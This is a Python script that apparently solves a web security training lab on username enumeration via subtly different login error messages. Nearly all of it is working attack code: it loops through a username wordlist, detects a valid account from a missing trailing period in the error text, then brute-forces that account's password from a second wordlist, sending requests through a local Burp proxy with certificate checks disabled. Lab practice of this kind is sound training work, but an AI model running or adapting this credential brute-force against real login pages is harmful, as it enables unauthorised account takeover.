"""
# Lab: Username enumeration via subtly different responses

-> Lab is subtly vulnerable to username enumeration and password brute-force attacks.
-> Username Wrong -> Error -> Invalid username and password.
-> password Wrong -> Error -> Invalid username and password
-> Please on your burpsuite
"""
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080',
           "https": "http://127.0.0.1:8080"
           }

usernames = open("usernames.txt", "r").read().split("\n")
passwords = open("passwords.txt", "r").read().split("\n")


def brute_username(url):
    for user in usernames:
        data = {
            'username': user,
            'password': "test"
        }
        req = requests.post(url, data=data, verify=False, proxies=proxies)
        res = req.text
        if "Invalid username or password." not in res:
            return user
 


def brute_password(url, user):
    for password in passwords:
        data = {
            'username': user,
            'password': password
        }
        req = requests.post(url, data=data, verify=False, proxies=proxies)
        res = req.text
        if "Invalid username or password" not in res:
            print(f"[+] {user}'s password: {password} ")


if __name__ == '__main__':
    print("Brute-Forcing Correct credentials")
    url = '<URL_OF_LAB_HERE>/login'
    print("-> Username Enumeration...")
    username = brute_username(url)
    print(f"[+] {username} is valid username!!")
    print(f"-> {username}'s password enumeration...")
    brute_password(url, username)
